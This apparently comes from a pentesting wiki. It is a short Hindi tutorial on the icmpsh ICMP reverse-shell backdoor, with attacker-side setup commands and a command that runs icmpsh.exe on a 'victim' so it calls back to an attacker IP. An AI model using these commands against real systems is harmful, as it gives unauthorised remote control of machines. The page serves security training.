{{#include ../banners/hacktricks-training.md}}

बैकडोर डाउनलोड करें: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# क्लाइंट साइड

स्क्रिप्ट चलाएँ: **run.sh**

**यदि आपको कुछ त्रुटि मिलती है, तो पंक्तियों को बदलने की कोशिश करें:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**के लिए:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **पीड़ित पक्ष**

**icmpsh.exe** को पीड़ित पर अपलोड करें और निष्पादित करें:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
